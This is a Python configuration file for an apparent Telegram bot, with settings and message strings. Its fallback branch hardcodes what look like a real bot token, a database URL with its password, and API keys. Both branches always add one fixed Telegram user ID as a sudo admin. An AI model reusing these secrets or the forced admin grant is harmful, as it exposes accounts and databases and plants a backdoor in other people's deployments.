import os

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
  else:
    BOT_TOKEN = "1326462146:AAHwdes0JfLsuHUSfCbRSj_EYBFYKu7Dxyg"
    DATABASE_URL = "postgres://bjldglvdaxtteh:188b494fc341df4c7ab75161f28fd0da3ebea8f7775ab85d7cebd1565790256b@ec2-54-81-37-115.compute-1.amazonaws.com:5432/d92i1o9pmotdg0"
    APP_ID = "1990511"
    API_HASH = "a4c5ee4c231eaf12c54a891381819acf"
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))


class Messages():
      HELP_MSG = [
        ".",

        "**rusak**"
      ]

      START_MSG = "**Hey [{}](tg://user?id={})**\n__rusak"
